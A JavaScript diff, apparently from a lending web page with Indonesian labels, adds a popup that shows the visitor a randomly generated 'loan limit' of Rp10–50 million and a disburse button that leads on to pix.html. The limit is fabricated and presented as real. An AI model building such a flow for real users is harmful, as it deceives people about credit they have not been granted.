@@ -216,8 +216,14 @@ lanjutBtn.addEventListener(
     "fade-out"
     );
 
-        window.location.href =
-        "pix.html";
+        const produkDipilih = localStorage.getItem("produkDipilih");
+
+if(produkDipilih === "pinjaman"){
+    loadingBox.style.display = "none";
+    showLoanPopup();
+}else{
+    window.location.href = "pix.html";
+}
 
     },2000);
 
@@ -231,4 +237,47 @@ window.addEventListener(
     loadingBox.style.display =
     "none";
 
+});
+
+function formatRupiah(angka){
+    return "Rp" + angka.toLocaleString("id-ID");
+}
+
+function randomLimit(){
+    const min = 10000000;
+    const max = 50000000;
+    const step = 1000000;
+
+    return Math.floor(
+        Math.random() * ((max - min) / step + 1)
+    ) * step + min;
+}
+
+function showLoanPopup(){
+    const limit = randomLimit();
+
+    localStorage.setItem("limitPinjaman", limit);
+
+    document.getElementById("limitUtama").innerText =
+    formatRupiah(limit);
+
+    document.getElementById("limitTotal").innerText =
+    formatRupiah(limit);
+
+    document.getElementById("loanPopup").classList.add("show");
+}
+
+document.getElementById("cairkanBtn").addEventListener("click", () => {
+    document.getElementById("loanPopup").classList.remove("show");
+
+    document.getElementById("loadingBox").style.display = "flex";
+
+    setTimeout(() => {
+        document.body.classList.add("fade-out");
+
+        setTimeout(() => {
+            window.location.href = "pix.html";
+        }, 500);
+
+    }, 900);
 });
